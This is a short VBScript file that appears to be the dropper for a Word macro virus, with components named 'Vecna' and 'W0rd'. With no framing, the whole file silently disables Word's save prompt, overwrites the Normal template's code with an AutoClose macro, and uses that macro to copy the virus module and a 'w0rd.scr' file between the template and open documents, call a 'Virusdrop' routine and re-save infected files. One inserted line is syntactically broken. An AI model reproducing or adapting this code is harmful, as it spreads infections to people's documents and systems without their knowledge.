On Error Resume Next
Dim WordObj
Set WordObj = WScript.CreateObject("Word.Application")
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoClose()"
NT.InsertLines 2, "On Error Resume Next"
NT.InsertLines 3, "NormalTemplate.VBProject.VBComponents(""ThisDocument"").Name = ""Vecna"""
NT.InsertLines 4, "Application.VBE.ActiveVBProject.VBComponents(""W0rd"").Export ""c:\"" & Application.UserName & "".pgp"""
NT.InsertLines 5, "For U = 1 To NormalTemplate.VBProject.VBComponents.Count"
NT.InsertLines 6, "If NormalTemplate.VBProject.VBComponents(U).Name = ""W0rd"" Then NormalInfect = True"
NT.InsertLines 7, "Next U"
NT.InsertLines 8, "For U = 1 To ActiveDocument.VBProject.VBComponents.Count"
NT.InsertLines 9, "If ActiveDocument.VBProject.VBComponents(U).Name = ""W0rd"" Then ActiveInfect = True"
NT.InsertLines 10, "Next U"
NT.InsertLines 11, "If ActiveInfect = True And NormalInfect = False Then Set mOn = NormalTemplate.VBProject Else _"
NT.InsertLines 12, "If ActiveInfect = False And NormalInfect = True Then Set mOn = ActiveDocument.VBProject"
NT.InsertLines 13, "With mOn"
NT.InsertLines 14, "With .VBComponents.Import(""c:\"" & Application.UserName & "".pgp"")"
NT.InsertLines 15, "With .VBComponents.Import("c:\w0rd.scr")"
NT.InsertLines 16, "End With"
NT.InsertLines 17, "End With"
NT.InsertLines 18, "Call Virusdrop"
NT.InsertLines 19, "If ActiveInfect = False Then ActiveDocument.SaveAs filename:=ActiveDocument.FullName, FileFormat:=wdFormatDocument"
NT.InsertLines 20, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
WordObj.Quit 